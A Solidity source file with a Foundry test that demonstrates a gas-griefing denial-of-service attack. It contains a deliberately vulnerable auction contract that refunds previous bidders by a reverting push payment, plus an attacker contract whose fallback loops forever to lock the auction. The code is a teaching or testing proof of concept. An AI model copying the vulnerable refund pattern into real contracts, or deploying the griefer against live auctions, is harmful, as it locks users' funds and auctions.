// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// @title Vulnerable Auction - subject to gas griefing
contract VulnerableAuction {
    address public highestBidder;
    uint256 public highestBid;

    function bid() public payable {
        require(msg.value > highestBid, "Bid not high enough");

        // Refund previous bidder
        if (highestBidder != address(0)) {
            (bool success, ) = highestBidder.call{value: highestBid}(""); 
            require(success, "Refund failed"); // <-- grief point
        }

        highestBidder = msg.sender;
        highestBid = msg.value;
    }

    function getState() public view returns (address, uint256) {
        return (highestBidder, highestBid);
    }
}

/// @title Attacker contract with gas-burning fallback
contract GasGriefer {
    fallback() external payable {
        // Infinite loop → consumes all gas
        while (true) {}
    }
}

/// @title Foundry test
contract GasGriefingTest is Test {
    VulnerableAuction auction;
    GasGriefer griefer;
    address honestUser = address(0xBEEF);

    function setUp() public {
        auction = new VulnerableAuction();
        griefer = new GasGriefer();

        // Attacker places first bid
        vm.deal(address(griefer), 1 ether);
        vm.prank(address(griefer));
        auction.bid{value: 1 ether}();
    }

    function testGasGriefingAttack() public {
        // Honest user tries to outbid
        vm.deal(honestUser, 2 ether);
        vm.startPrank(honestUser);

        // Expect revert because refund to griefer runs out of gas
        vm.expectRevert(); 
        auction.bid{value: 2 ether}();

        vm.stopPrank();

        // Assert auction is stuck with attacker as highestBidder
        (address bidder, uint bid) = auction.getState();
        assertEq(bidder, address(griefer), "Auction locked by griefer");
        assertEq(bid, 1 ether, "Bid should remain attacker's");
    }
}
